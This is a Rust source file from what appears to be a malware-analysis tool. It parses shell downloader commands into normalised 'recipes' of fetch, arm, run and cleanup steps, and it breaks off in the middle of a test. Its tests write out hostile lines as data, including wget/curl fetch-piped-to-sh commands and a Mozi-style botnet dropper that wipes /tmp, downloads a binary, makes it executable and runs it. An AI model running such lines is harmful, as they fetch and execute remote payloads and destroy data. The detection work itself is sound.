    fn open_frame(&mut self, kind: Kind) {
        if self.frames.len() >= MAX_NEST {
            return self.over(OpaqueReason::TooDeep);
        }
        let mark = self.mark();
        self.frames.push(Frame::new(kind, mark));
    }

    fn close_group(&mut self) {
        if self.top().kind == Kind::Group
            && let Some(frame) = self.frames.pop()
        {
            self.close(frame);
        }
    }

    /// Hand a finished group to the frame below, as a stage of its pipeline.
    fn close(&mut self, mut frame: Frame) {
        frame.end_list(self.mark());
        let nodes = match frame.kind {
            Kind::If { arm, status, .. } => {
                let (mut first, fallback) = if arm == Arm::Else {
                    (frame.first, frame.list)
                } else {
                    let mut first = frame.first;
                    first.append(frame.list);
                    (first, List::default())
                };
                // `scp …; if [ $? -eq 0 ]`: the branch stands on that fetch.
                let parent = &mut self.top().list.nodes;
                if status
                    && matches!(parent.last(), Some(Node::Step(Step::Fetch { .. })))
                    && let Some(fetch) = parent.pop()
                {
                    first.nodes.insert(0, fetch);
                }
                List::branch(first, fallback)
            }
            Kind::Root | Kind::Group => frame.list,
        };
        self.top().stages.append(nodes);
    }

    fn op(&mut self, op: Op) {
        self.redir = None;
        self.end_command();
        let mark = self.mark();
        match op {
            Op::Sep => self.top().end_list(mark),
            Op::And => self.top().end_pipeline(mark),
            Op::Or => self.top().or(mark),
            Op::Pipe => self.top().piped = true,
            Op::Open => self.open_frame(Kind::Group),
            Op::Close => self.close_group(),
        }
    }

    fn end_command(&mut self) {
        let mut cmd = take(&mut self.cmd);
        cmd.body = self.lex.body.take();
        if cmd.words.is_empty() {
            // `(wget … || curl …) > file`.
            if cmd.out.is_some() {
                self.save_pipeline();
            }
        } else {
            let (words, assigned) = unwrap_command(&cmd.words);
            if assigned {
                self.emit(Step::Prepare("set".to_string()));
            }
            if let [head, args @ ..] = words {
                self.command(head, args, &cmd);
            }
        }
        // The body comes at the newline, which may end a later command:
        // `sh <<EOF &`, `cat <<EOF | sh`.
        if self.heredoc_runs
            && let Some((start, end)) = cmd.body
        {
            self.heredoc_runs = false;
            let at = Span {
                layer: self.layer,
                start,
                end,
            };
            self.open_shell(at, self.text[start..end].to_vec());
        }
    }

    fn emit(&mut self, step: Step) {
        if self.stopped {
            return;
        }
        if self.budget.steps == 0 {
            return self.over(OpaqueReason::OverLimit);
        }
        self.budget.steps -= 1;
        self.top().stages.push(Node::Step(step), 0);
    }

    /// A token a step holds on to. One over the limit stops the recipe.
    fn keep(&mut self, bytes: &[u8]) -> Option<String> {
        let value = String::from_utf8_lossy(bytes).into_owned();
        if value.len() > MAX_VALUE {
            self.over(OpaqueReason::OverLimit);
            return None;
        }
        Some(value)
    }

    /// The attacker's tag, when the word is a value they wrote down.
    fn tag(&mut self, word: Option<&Word>) -> Option<String> {
        let word = word.filter(|w| !w.dynamic && !w.text.is_empty())?;
        if word.text.starts_with(b"-") || self.masked(word) {
            return None;
        }
        self.keep(&word.text)
    }

    fn save_pipeline(&mut self) {
        let from = self.top().pipe_start.files;
        for file in self.files.iter_mut().skip(from) {
            file.saved = true;
        }
    }

    /// A shell reads this pipeline: what it fetched, and what it printed.
    fn pipeline_is_run(&mut self) {
        self.save_pipeline();
        let from = self.top().pipe_start.fed.min(self.fed.len());
        for sub in self.fed.split_off(from) {
            self.output_is_run(sub);
        }
    }

    fn ran(&mut self, name: &[u8]) {
        for file in &mut self.files {
            if file.name.as_deref() == Some(name) {
                file.saved = true;
            }
        }
    }

    fn is_dropped(&self, name: &[u8]) -> bool {
        self.files.iter().any(|f| f.name.as_deref() == Some(name))
    }

    fn command(&mut self, head: &Word, args: &[Word], cmd: &Command) {
        if self.masked(head) {
            return self.emit(Step::Other(UNNAMED.to_string()));
        }
        let name = base(&head.text);
        let out = cmd.out.as_ref();
        if let Some(sub) = head.only_substitution() {
            self.output_is_run(sub);
        }
        if is_payload_path(&head.text) {
            return self.run_binary(head, args);
        }
        if matches!(name, b"echo" | b"printf" | b"cat") {
            let subs = args.iter().flat_map(|w| w.subs.iter().copied());
            self.fed.extend(subs);
        }
        match name {
            b"cd" | b"pushd" | b"mkdir" | b"export" | b"umask" | b"ulimit" | b"unset" | b"set" => {
                self.emit(Step::Prepare(plain_name(name)));
            }
            // On purpose not one step: `chmod 600` readies a key and `chmod
            // 777` arms a payload, so the recipes differ in `normal` too.
            b"chmod" => {
                let mode = args.iter().find(|w| !w.text.starts_with(b"-R"));
                if mode.is_some_and(|w| is_exec_mode(&w.text)) {
                    self.emit(Step::Arm);
                } else {
                    self.emit(Step::Prepare(plain_name(name)));
                }
            }
            b"rm" | b"rmdir" | b"unlink" | b"shred" => {
                let dropped = !self.files.is_empty();
                self.emit(if dropped { Step::Cleanup } else { Step::Wipe });
            }
            b"history" if args.iter().any(|w| w.text == b"-c") => self.emit(Step::Cleanup),
            b"wget" => self.fetch("wget", WGET_VALUES, args, out),
            b"curl" => self.fetch("curl", CURL_VALUES, args, out),
            b"scp" => self.fetch("scp", SCP_VALUES, args, out),
            b"tftp" => self.fetch("tftp", TFTP_VALUES, args, out),
            b"ftpget" => self.fetch("ftpget", FTPGET_VALUES, args, out),
            b"nc" | b"ncat" | b"netcat" if !listens(args) => {
                self.fetch("nc", NC_VALUES, args, out);
            }
            b"certutil" | b"certutil.exe"
                if args
                    .iter()
                    .any(|w| w.text.eq_ignore_ascii_case(b"-urlcache")) =>
            {
                self.fetch("certutil", NO_VALUES, args, out);
            }
            b"powershell" | b"powershell.exe" | b"pwsh" => {
                self.code_fetch("powershell", args, POWERSHELL_CODE);
                self.emit(Step::Other("powershell".to_string()));
            }
            b"[" | b"[[" | b"test" => self.status_test(args),
            b"echo" | b"printf" if out.is_some() => {
                let data = self.literal(args);
                self.write(data, out);
            }
            b"cat" | b"base64" | b"xxd" if out.is_some() => {
                let body = cmd.body.map(|(start, end)| Span {
                    layer: self.layer,
                    start,
                    end,
                });
                self.write(body, out);
            }
            b"tee" => {
                let file = args.iter().find(|w| !w.text.starts_with(b"-"));
                self.write(None, file);
            }
            // Bare words are opened too, but only quoted or expanding ones
            // show that this is no sentence.
            b"eval" if !args.is_empty() => {
                self.open_script(args);
                self.emit(if args.iter().any(|w| w.quoted || w.dynamic) {
                    Step::Run {
                        what: plain_name(name),
                        tag: None,
                    }
                } else {
                    Step::Other(plain_name(name))
                });
            }
            _ if SHELLS.contains(&name) => self.run_interpreter(name, b"c", true, cmd, args),
            _ => {
                if let Some((_, inline)) = INTERPRETERS.iter().find(|(n, _)| *n == name) {
                    self.run_interpreter(name, inline, false, cmd, args);
                } else if self.is_dropped(name) {
                    self.run_binary(head, args);
                } else {
                    self.emit(Step::Other(plain_name(name)));
                }
            }
        }
    }

    /// A dropped binary: `/tmp/Mozi.a <tag>`.
    fn run_binary(&mut self, head: &Word, args: &[Word]) {
        let what = self.keep(&head.text);
        let tag = self.tag(args.last());
        self.ran(base(&head.text));
        if let Some(what) = what {
            self.emit(Step::Run { what, tag });
        }
    }

    /// `[ $? -eq 0 ]` as the condition of an `if`.
    fn status_test(&mut self, args: &[Word]) {
        let has = |text: &[u8]| args.iter().any(|w| w.text == text);
        let equal = has(b"-eq") || has(b"=") || has(b"==");
        let success = has(b"$?") && has(b"0") && equal;
        if let Kind::If {
            arm: Arm::Cond,
            status,
            ..
        } = &mut self.top().kind
        {
            *status |= success;
        }
    }

    /// What `echo` or `printf` writes, when it is in the text.
    fn literal(&self, args: &[Word]) -> Option<Span> {
        let flags = args
            .iter()
            .take_while(|w| matches!(w.text.as_slice(), b"-n" | b"-e" | b"-E" | b"-ne" | b"-en"))
            .count();
        match &args[flags..] {
            [] => None,
            [one] => Some(one.span(self.layer)),
            [first, .., last] => Some(Span {
                layer: self.layer,
                start: first.start,
                end: last.end,
            }),
        }
    }

    fn write(&mut self, data: Option<Span>, file: Option<&Word>) {
        self.emit(Step::Write(data));
        self.files.push(File {
            target: None,
            name: file.map(|w| base(&w.text).to_vec()),
            saved: false,
        });
    }

    /// A shell or interpreter: `sh -s <tag>` reads its input, `sh <file>
    /// <tag>` runs the file, and `sh -c …` carries its code as an argument.
    /// A heredoc to a shell is read as shell.
    fn run_interpreter(
        &mut self,
        name: &[u8],
        inline: &[u8],
        shell: bool,
        cmd: &Command,
        args: &[Word],
    ) {
        let mut rest = args;
        let mut reads_input = false;
        let mut has_code = false;
        while let [word, more @ ..] = rest {
            let text = word.text.as_slice();
            if text == b"--" || text == b"-" {
                reads_input |= text == b"-";
                rest = more;
                break;
            }
            if text.len() < 2 || !matches!(text[0], b'-' | b'+') {
                break;
            }
            rest = more;
            if !text.starts_with(b"--") {
                let flags = &text[1..];
                reads_input |= shell && flags.contains(&b's');
                has_code |= flags.iter().any(|f| inline.contains(f));
                // `-o pipefail`, `-eo pipefail`, `+o history`.
                if shell && flags.ends_with(b"o") {
                    rest = rest.get(1..).unwrap_or_default();
                }
            }
        }
        let what = if has_code || reads_input {
            None
        } else {
            rest.first()
        };
        let piped = self.top().piped;
        let file_like = what.is_some_and(|f| f.url_like() || self.is_dropped(base(&f.text)));
        let stdin = cmd.stdin.as_ref().filter(|_| what.is_none() && !has_code);
        if !shell && !has_code && !piped && !file_like && stdin.is_none() {
            return self.emit(Step::Other(plain_name(name)));
        }
        if has_code {
            if shell {
                self.open_script(&rest[..rest.len().min(1)]);
            } else if name.starts_with(b"python") {
                self.code_fetch("python", args, PYTHON_CODE);
            } else if name == b"perl" {
                self.code_fetch("perl", args, PERL_CODE);
            }
            rest = &[];
        } else if shell && what.is_none() {
            self.heredoc_runs = cmd.body.is_some() || self.lex.heredoc.is_some();
        }
        if let Some((word, string)) = stdin {
            self.stdin_is_code(word, *string, shell || matches!(name, b"." | b"source"));
        }
        let process = what.and_then(Word::process_substitution);
        if let Some(sub) = process {
            self.output_is_run(sub);
        } else if let Some(file) = what {
            self.ran(base(&file.text));
        } else if piped {
            self.pipeline_is_run();
        }
        if what.is_some() {
            rest = &rest[1..];
        }
        let what = match what.filter(|_| process.is_none()) {
            Some(file) if self.masked(file) => UNNAMED.as_bytes(),
            Some(file) => file.text.as_slice(),
            None => name,
        };
        let what = self.keep(what);
        let tag = self.tag(rest.last());
        if let Some(what) = what {
            self.emit(Step::Run { what, tag });
        }
    }

    /// Code for another language, read as text only: its URLs are fetches
    /// when it says so, and saved when it also runs or saves the result.
    fn code_fetch(&mut self, tool: &str, words: &[Word], (fetches, runs): CodeWords) {
        let (Some(first), Some(last)) = (words.first(), words.last()) else {
            return;
        };
        let (start, end) = (first.start, last.end);
        let code = self.text[start..end].to_ascii_lowercase();
        let says = |list: &[&str]| {
            list.iter()
                .any(|word| code.windows(word.len()).any(|w| w == word.as_bytes()))
        };
        if !says(fetches) {
            return;
        }
        let saved = says(runs);
        for (from, to, _) in urls_in(&self.text[start..end]) {
            let target = Span {
                layer: self.layer,
                start: start + from,
                end: start + to,
            };
            self.emit(Step::Fetch {
                tool: tool.to_string(),
                target,
                saves: false,
            });
            self.files.push(File {
                target: Some(target.start),
                name: None,
                saved,
            });
        }
    }

    /// `sh <<< "$(…)"`, `sh < <(…)`, `sh <<< 'code'`, `sh < file`.
    fn stdin_is_code(&mut self, word: &Word, string: bool, reads_shell: bool) {
        if let Some(sub) = word.only_substitution() {
            self.output_is_run(sub);
        } else if !string {
            self.ran(base(&word.text));
        } else if reads_shell {
            self.open_script(std::slice::from_ref(word));
        }
    }

    fn fetch(
        &mut self,
        tool: &str,
        values: (&[u8], &[u8]),
        args: &[Word],
        redirect: Option<&Word>,
    ) {
        let found = fetch_args(args, values);
        let output = found.output.filter(|o| is_file(o));
        let all = found.positional.as_slice();
        // The sources, whether they always end up in a file, and that file.
        let (sources, always, local) = match (tool, all) {
            ("scp", [sources @ .., local])
                if !sources.is_empty() && sources.iter().all(|w| w.text.contains(&b':')) =>
            {
                (sources, is_file(&local.text), Some(local.text.as_slice()))
            }
            ("tftp", [host, rest @ ..]) => (
                std::slice::from_ref(host),
                true,
                found.output.or(rest.last().map(|w| w.text.as_slice())),
            ),
            ("ftpget", [host, local, ..]) => (
                std::slice::from_ref(host),
                true,
                Some(local.text.as_slice()),
            ),
            ("certutil", [url, rest @ ..]) => (
                std::slice::from_ref(url),
                true,
                rest.last().map(|w| w.text.as_slice()),
            ),
            ("nc", [host, ..]) => (std::slice::from_ref(host), false, None),
            ("wget" | "curl", all) => {
                // wget saves unless told otherwise; curl prints.
                let by_default = tool == "wget" && found.output.is_none() && !found.spider;
                (
                    all,
                    output.is_some() || found.remote_name || by_default,
                    output,
                )
            }
            _ => (&[][..], false, None),
        };
        let url_named = !matches!(tool, "curl" | "nc") || found.remote_name;
        let mut any = false;
        for source in sources.iter().filter(|w| w.url_like()) {
            any = true;
            let target = source.span(self.layer);
            let local = local
                .map(base)
                .filter(|name| !matches!(*name, b"" | b"."))
                .or(url_named.then(|| url_name(&source.text)));
            let name = redirect.map_or(local, |file| Some(base(&file.text)));
            // Its host is still known: only the URL is too long to keep.
            if target.end - target.start > MAX_VALUE {
                push_opaque(self.xray, target, OpaqueReason::OverLimit);
            }
            self.emit(Step::Fetch {
                tool: tool.to_string(),
                target,
                saves: false,
            });
            self.files.push(File {
                target: Some(target.start),
                name: name.map(<[u8]>::to_vec),
                saved: always || redirect.is_some(),
            });
        }
        if !any {
            self.emit(Step::Other(tool.to_string()));
        }
    }
}

/// Call `visit` on every step, in order. The height of the tree bounds the
/// recursion.
fn walk(nodes: &mut [Node], visit: &mut impl FnMut(&mut Step)) {
    for node in nodes {
        match node {
            Node::Step(step) => visit(step),
            Node::Pipe(inner) => walk(inner, visit),
            Node::Try { first, fallback } => {
                walk(first, visit);
                walk(fallback, visit);
            }
        }
    }
}

/// `nc -l`: it waits, and fetches nothing.
fn listens(args: &[Word]) -> bool {
    args.iter()
        .any(|w| w.text.starts_with(b"-") && w.text.contains(&b'l'))
}

fn is_runner(what: &str) -> bool {
    let what = what.as_bytes();
    what == b"eval" || SHELLS.contains(&what) || INTERPRETERS.iter().any(|(name, _)| *name == what)
}

fn render_step(step: &Step, out: &mut String) {
    match step {
        Step::Prepare(name) => *out += &format!("prepare({name})"),
        Step::Write(_) => *out += "write",
        Step::Fetch { tool, .. } => *out += &format!("fetch({tool} <url>)"),
        Step::Run { what, tag } => {
            *out += "run(";
            *out += if is_runner(what) { what } else { "<file>" };
            *out += if tag.is_some() { " <tag>)" } else { ")" };
        }
        Step::Arm => *out += "arm",
        Step::Wipe => *out += "wipe",
        Step::Cleanup => *out += "cleanup",
        Step::Other(name) => *out += &format!("other({name})"),
    }
}

/// Stops once past the limit. The height of the tree bounds the recursion.
fn render(nodes: &[Node], separator: &str, out: &mut String) {
    for (i, node) in nodes.iter().enumerate() {
        if out.len() > MAX_VALUE {
            return;
        }
        if i > 0 {
            *out += separator;
        }
        match node {
            Node::Step(step) => render_step(step, out),
            Node::Pipe(stages) => render(stages, " | ", out),
            Node::Try { first, fallback } => {
                *out += "try[ ";
                render(first, " → ", out);
                *out += " ]";
                if !fallback.is_empty() {
                    *out += " else [ ";
                    render(fallback, " → ", out);
                    *out += " ]";
                }
            }
        }
    }
}

/// Read `layer` as shell and push its recipe, then do the same for all the
/// code inside it, each opened as a `Shell` child layer: `$( )`, backticks,
/// `sh -c`, `eval` and heredocs to a shell. So call this on the layers around
/// them only, not on layers it opened. A layer that fetches, runs or writes
/// nothing is no recipe, and costs no steps. `masks` holds the key ranges of
/// the layers open so far: no step keeps a word overlapping one. A layer it
/// opens itself, or one past the list, is searched for keys here.
pub(crate) fn read_recipes(
    xray: &mut Xray,
    layer: usize,
    budget: &mut Budget,
    masks: &[Vec<(usize, usize)>],
) {
    let mut queue = VecDeque::from([layer]);
    let mut run_output = Vec::new();
    while let Some(at) = queue.pop_front() {
        if at >= xray.layers.len() {
            continue;
        }
        let text = take(&mut xray.layers[at].text);
        let mask = masks.get(at).cloned().unwrap_or_else(|| key::ranges(&text));
        read_layer(xray, at, &text, mask, budget, &mut queue, &mut run_output);
        xray.layers[at].text = text;
    }
    // Last, as the run may come after the layer holding the fetch was read.
    for recipe in &mut xray.recipes {
        if run_output.contains(&recipe.layer) {
            walk(&mut recipe.nodes, &mut |step| {
                if let Step::Fetch { saves, .. } = step {
                    *saves = true;
                }
            });
        }
    }
}

fn read_layer(
    xray: &mut Xray,
    layer: usize,
    text: &[u8],
    mask: Vec<(usize, usize)>,
    budget: &mut Budget,
    queue: &mut VecDeque<usize>,
    run_output: &mut Vec<usize>,
) {
    let steps = budget.steps;
    let mut reader = Reader {
        xray,
        budget,
        queue,
        run_output,
        layer,
        text,
        mask,
        lex: Lexer::new(text),
        root: Frame::new(Kind::Root, Mark::default()),
        frames: Vec::new(),
        cmd: Command::default(),
        redir: None,
        files: Vec::new(),
        fed: Vec::new(),
        stopped: false,
        sealed: false,
        heredoc_runs: false,
    };
    let mut nodes = reader.run().nodes;
    let files = reader.files;

    let mut worth_keeping = false;
    walk(&mut nodes, &mut |step| {
        worth_keeping |= !matches!(step, Step::Other(_) | Step::Prepare(_));
        if let Step::Fetch { target, saves, .. } = step {
            let start = Some(target.start);
            *saves = files.iter().any(|f| f.saved && f.target == start);
        }
    });
    if !worth_keeping {
        budget.steps = steps;
        return;
    }
    let mut normal = String::new();
    render(&nodes, " → ", &mut normal);
    if normal.len() > MAX_VALUE {
        let mut end = MAX_VALUE;
        while !normal.is_char_boundary(end) {
            end -= 1;
        }
        normal.truncate(end);
        let at = Span {
            layer,
            start: 0,
            end: text.len(),
        };
        push_opaque(xray, at, OpaqueReason::OverLimit);
    }
    xray.recipes.push(Recipe {
        layer,
        nodes,
        normal,
    });
}

#[cfg(test)]
mod tests {
    use super::super::{
        MAX_DEPTH, MAX_LAYERS, MAX_OUTPUT, MAX_PIECES, MAX_STEPS, OpaqueReason, Recipe,
    };
    use super::*;

    fn read(text: &str) -> Xray {
        read_bytes(text.as_bytes())
    }

    fn read_bytes(text: &[u8]) -> Xray {
        let mut x = Xray::new(text);
        read_recipes(&mut x, 0, &mut Budget::default(), &[]);
        x
    }

    fn only(x: &Xray) -> &Recipe {
        assert_eq!(x.recipes.len(), 1, "{:?}", x.recipes);
        &x.recipes[0]
    }

    fn steps(nodes: &[Node]) -> Vec<&Step> {
        let mut out = Vec::new();
        let mut stack: Vec<&Node> = nodes.iter().rev().collect();
        while let Some(node) = stack.pop() {
            match node {
                Node::Step(step) => out.push(step),
                Node::Pipe(inner) => stack.extend(inner.iter().rev()),
                Node::Try { first, fallback } => {
                    stack.extend(fallback.iter().rev());
                    stack.extend(first.iter().rev());
                }
            }
        }
        out
    }

    fn height(nodes: &[Node]) -> usize {
        let mut deepest = 0;
        let mut stack: Vec<(&Node, usize)> = nodes.iter().map(|n| (n, 1)).collect();
        while let Some((node, depth)) = stack.pop() {
            deepest = deepest.max(depth);
            match node {
                Node::Step(_) => {}
                Node::Pipe(inner) => stack.extend(inner.iter().map(|n| (n, depth + 1))),
                Node::Try { first, fallback } => {
                    stack.extend(first.iter().chain(fallback).map(|n| (n, depth + 1)))
                }
            }
        }
        deepest
    }

    fn text(x: &Xray, at: Span) -> String {
        String::from_utf8_lossy(&x.layers[at.layer].text[at.start..at.end]).into_owned()
    }

    /// Tool, target text and `saves` of a fetch.
    fn fetch(x: &Xray, step: &Step) -> (String, String, bool) {
        match step {
            Step::Fetch {
                tool,
                target,
                saves,
            } => (tool.clone(), text(x, *target), *saves),
            other => panic!("not a fetch: {other:?}"),
        }
    }

    fn run(what: &str, tag: Option<&str>) -> Step {
        Step::Run {
            what: what.to_string(),
            tag: tag.map(str::to_string),
        }
    }

    fn fetches_saved(x: &Xray) -> Vec<bool> {
        steps(&only(x).nodes)
            .into_iter()
            .filter(|s| matches!(s, Step::Fetch { .. }))
            .map(|s| fetch(x, s).2)
            .collect()
    }

    fn over_limit(x: &Xray) -> bool {
        x.opaque.iter().any(|o| o.reason == OpaqueReason::OverLimit)
    }

    fn too_deep(x: &Xray) -> bool {
        x.opaque.iter().any(|o| o.reason == OpaqueReason::TooDeep)
    }

    const FALLBACK: &str = "(wget -qO- https://example.org/sh || curl -sk https://example.org/sh)";

    #[test]
    fn pipe_to_sh_runs_the_fetch() {
        let x = read(&format!("{FALLBACK} | sh -s apache"));
        let recipe = only(&x);
        assert_eq!(recipe.layer, 0);
        let [Node::Pipe(stages)] = recipe.nodes.as_slice() else {
            panic!("{:?}", recipe.nodes);
        };
        let [Node::Try { first, fallback }, Node::Step(last)] = stages.as_slice() else {
            panic!("{stages:?}");
        };
        let [Node::Step(a)] = first.as_slice() else {
            panic!("{first:?}");
        };
        let [Node::Step(b)] = fallback.as_slice() else {
            panic!("{fallback:?}");
        };
        let url = "https://example.org/sh".to_string();
        assert_eq!(fetch(&x, a), ("wget".to_string(), url.clone(), true));
        assert_eq!(fetch(&x, b), ("curl".to_string(), url, true));
        assert_eq!(*last, run("sh", Some("apache")));
    }

    #[test]
    fn if_else_keeps_both_branches() {
        let x = read(&format!(
            "cd /tmp; echo data > /tmp/.k; chmod 600 /tmp/.k; \
             scp -i /tmp/.k -o StrictHostKeyChecking=no u@example.org:/sh out_sh; \
             if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh t.x; \
             else {FALLBACK} | sh -s t.x; fi; rm -f /tmp/.k"
        ));
        let recipe = only(&x);
        let [
            Node::Step(Step::Prepare(cd)),
            Node::Step(Step::Write(Some(data))),
            Node::Step(Step::Prepare(chmod)),
            Node::Try { first, fallback },
            Node::Step(Step::Cleanup),
        ] = recipe.nodes.as_slice()
        else {
            panic!("{:?}", recipe.nodes);
        };
        assert_eq!((cd.as_str(), chmod.as_str()), ("cd", "chmod"));
        assert_eq!(text(&x, *data), "data");
        // The `$?` test ties the scp to the branch it decides.
        let first = steps(first);
        assert_eq!(first.len(), 3);
        assert_eq!(
            fetch(&x, first[0]),
            ("scp".to_string(), "u@example.org:/sh".to_string(), true)
        );
        assert_eq!(*first[1], Step::Arm);
        assert_eq!(*first[2], run("out_sh", Some("t.x")));
        let fallback = steps(fallback);
        assert_eq!(fallback.len(), 3);
        assert!(fetch(&x, fallback[0]).2 && fetch(&x, fallback[1]).2);
        assert_eq!(*fallback[2], run("sh", Some("t.x")));
        assert_eq!(
            recipe.normal,
            "prepare(cd) → write → prepare(chmod) → try[ fetch(scp <url>) → arm → \
             run(<file> <tag>) ] else [ try[ fetch(wget <url>) ] else [ fetch(curl <url>) ] | \
             run(sh <tag>) ] → cleanup"
        );
    }

    #[test]
    fn tag_from_a_dropped_binary() {
        let x = read("/tmp/Mozi.a jaws");
        assert_eq!(
            only(&x).nodes,
            [Node::Step(run("/tmp/Mozi.a", Some("jaws")))]
        );
    }

    #[test]
    fn tag_is_the_last_argument_to_the_payload() {
        for (line, what, tag) in [
            ("sh -s apache", "sh", Some("apache")),
            ("sh -s -- apache", "sh", Some("apache")),
            ("sh", "sh", None),
            (
                "bash -x ./i.sh cve_2024_4577.selfrep",
                "./i.sh",
                Some("cve_2024_4577.selfrep"),
            ),
            ("sh out_sh php2shell", "out_sh", Some("php2shell")),
            (
                "nohup ./bin one two > /dev/null 2>&1 &",
                "./bin",
                Some("two"),
            ),
            ("./bin --daemon", "./bin", None),
            ("./bin $(hostname)", "./bin", None),
            ("sh -c 'wget x'", "sh", None),
        ] {
            let x = read(line);
            assert_eq!(steps(&only(&x).nodes), [&run(what, tag)], "{line}");
        }
    }

    #[test]
    fn mozi_steps_are_named() {
        let x = read(
            "cd /tmp; rm -rf *; wget http://192.0.2.1:8088/Mozi.a; chmod 777 Mozi.a; \
             /tmp/Mozi.a jaws",
        );
        let found = steps(&only(&x).nodes);
        assert_eq!(*found[0], Step::Prepare("cd".to_string()));
        assert_eq!(*found[1], Step::Wipe);
        assert_eq!(
            fetch(&x, found[2]),
            (
                "wget".to_string(),
                "http://192.0.2.1:8088/Mozi.a".to_string(),
                true
            )
        );
        assert_eq!(*found[3], Step::Arm);
        assert_eq!(*found[4], run("/tmp/Mozi.a", Some("jaws")));
        assert_eq!(found.len(), 5);
    }

    #[test]
    fn command_substitution_and_backticks_open() {
        let x = read(
            "echo $(wget -qO- https://example.org/a | sh); \
             echo \"`curl -s https://example.org/b > /tmp/b`\"; echo $((1 + 2)) > /tmp/n",
        );
        let shells: Vec<_> = x
            .layers
            .iter()
            .filter(|l| l.kind == LayerKind::Shell)
            .collect();
        assert_eq!(shells.len(), 2);
        for shell in &shells {
            assert_eq!(shell.parent, Some(0));
            let from = shell.from.unwrap();
            assert_eq!(from.layer, 0);
            assert_eq!(
                &x.layers[0].text[from.start..from.end],
                shell.text.as_slice()
            );
        }
        assert_eq!(shells[0].text, b"wget -qO- https://example.org/a | sh");
        assert_eq!(shells[1].text, b"curl -s https://example.org/b > /tmp/b");
        let in_children: Vec<_> = x.recipes.iter().filter(|r| r.layer != 0).collect();
        assert_eq!(in_children.len(), 2);
        assert_eq!(x.opaque, []);
    }

    #[test]
    fn nested_substitutions_open_as_a_chain_and_stop_at_the_depth_limit() {
        let mut body = "wget http://example.org/x".to_string();
        for _ in 0..8 {
            body = format!("echo $({body})");
        }
        let x = read(&body);
        assert_eq!(x.layers.len(), 7, "raw plus 6");
        assert_eq!(x.depth(6), 6);
        assert!(too_deep(&x));
    }

    #[test]
    fn quotes_do_not_split() {
        let x = read(
            "wget \"https://example.org/a;b c\" -O '/tmp/x y'; echo 'a;b|c && d' > /tmp/z; \
             sh '/tmp/x y'",
        );
        let found = steps(&only(&x).nodes);
        assert_eq!(found.len(), 3);
        assert_eq!(fetch(&x, found[0]).1, "https://example.org/a;b c");
        let Step::Write(Some(data)) = found[1] else {
            panic!("{:?}", found[1]);
        };
        assert_eq!(text(&x, *data), "a;b|c && d");
        assert_eq!(*found[2], run("/tmp/x y", None));
    }

    #[test]
    fn normal_form_hides_hosts_and_numbers() {
        let a = read(
            "cd /tmp; rm -rf *; wget http://192.0.2.1:8088/Mozi.a; chmod 777 Mozi.a; \
             /tmp/Mozi.a jaws",
        );
        let b = read(
            "cd /var/run; rm -rf *; wget https://example.org:81/other; chmod 755 other; \
             /tmp/other dlink",
        );
        assert_eq!(only(&a).normal, only(&b).normal);
        for hidden in ["192.0.2.1", "8088", "Mozi", "777", "jaws"] {
            assert!(!only(&a).normal.contains(hidden), "{hidden}");
        }
        let c = read("cd /tmp; wget http://192.0.2.1:8088/Mozi.a | sh");
        assert_ne!(only(&a).normal, only(&c).normal);
    }

    #[test]
    fn ten_thousand_semicolons_stay_within_limits() {
        let x = read(&";".repeat(10_000));
        assert_eq!(x.layers.len(), 1);
        assert_eq!(x.recipes, []);
        assert_eq!(x.opaque, []);

        let x = read(&"wget http://example.org/x;".repeat(10_000));
        assert_eq!(steps(&only(&x).nodes).len(), MAX_STEPS);
        assert!(over_limit(&x));
        assert!(only(&x).normal.len() <= MAX_VALUE);
    }

    #[test]
    fn deep_structures_stay_within_limits() {
        for body in [
            "(".repeat(100_000),
            "{ ".repeat(100_000),
            "if ".repeat(100_000),
            "if a; then ".repeat(10_000),
            "if a; then b; elif ".repeat(10_000),
            "wget http://example.org/x || ".repeat(10_000),
            "(wget http://example.org/x) | ".repeat(10_000),
            format!(
                "{}wget http://example.org/x | sh{}",
                "(".repeat(10_000),
                ")".repeat(10_000)
            ),
            "$(".repeat(50_000),
            "`".repeat(50_001),
            "\"$(".repeat(50_000),
        ] {
            let x = read(&body);
            assert!(x.layers.len() <= MAX_LAYERS);
            assert!(x.layers.iter().skip(1).map(|l| l.text.len()).sum::<usize>() <= MAX_OUTPUT);
            for recipe in &x.recipes {
                assert!(height(&recipe.nodes) <= 2 * MAX_NEST + 2);
            }
        }
        assert!(too_deep(&read(&"(".repeat(100))));
        let chain = read(&"wget http://example.org/x || ".repeat(100));
        assert!(too_deep(&chain));
        assert!(height(&only(&chain).nodes) <= 2 * MAX_NEST + 2);
    }

    #[test]
    fn steps_have_their_own_budget_shared_between_layers() {
        let body: &[u8] = b"cd /tmp; wget http://example.org/x; ./x tag";
        let mut x = Xray::new(body);
        let mut budget = Budget::default();
        read_recipes(&mut x, 0, &mut budget, &[]);
        assert_eq!(budget.steps, MAX_STEPS - 3);
        assert_eq!(budget.pieces, MAX_PIECES, "left to the piece extractor");

        let mut x = Xray::new(body);
        let mut budget = Budget {
            steps: 2,
            ..Budget::default()
        };
        read_recipes(&mut x, 0, &mut budget, &[]);
        assert_eq!(steps(&only(&x).nodes).len(), 2);
        assert_eq!(budget.steps, 0);
        assert_eq!(budget.pieces, MAX_PIECES);
        assert!(over_limit(&x));
        assert_eq!(x.opaque[0].at.layer, 0);

        let mut x = Xray::new(&b"wget http://example.org/x;".repeat(1000));
        let mut budget = Budget::default();
        read_recipes(&mut x, 0, &mut budget, &[]);
        assert_eq!(budget.steps, 0);
        assert_eq!(budget.pieces, MAX_PIECES, "a long recipe starves no pieces");
    }

    #[test]
    fn long_data_is_no_token_over_the_limit() {
        let data = "A".repeat(4096);
        let x = read(&format!("echo '{data}' > /tmp/k; sh /tmp/k"));
        let found = steps(&only(&x).nodes);
        assert_eq!(found.len(), 2);
        let Step::Write(Some(at)) = found[0] else {
            panic!("{:?}", found[0]);
        };
        assert_eq!(text(&x, *at), data);
        assert_eq!(x.opaque, []);
    }

    #[test]
    fn tokens_over_the_limit_stop_the_recipe() {
        let long = "a".repeat(MAX_VALUE + 1);
        for line in [
            format!("rm -f a; ./x {long}; rm x"),
            format!("rm -f a; echo a > {long}; {long} tag; rm x"),
            format!(
                "rm -f a; ./x tag; echo {}; rm x",
                "a ".repeat(MAX_PIECES + 1)
            ),
        ] {
            let x = read(&line);
            assert!(over_limit(&x), "{line}");
            let found = steps(&only(&x).nodes);
            assert_eq!(*found[0], Step::Wipe);
            assert!(!found.contains(&&Step::Cleanup), "{line}");
        }
    }

    #[test]
    fn a_target_over_the_limit_is_marked_and_reading_goes_on() {
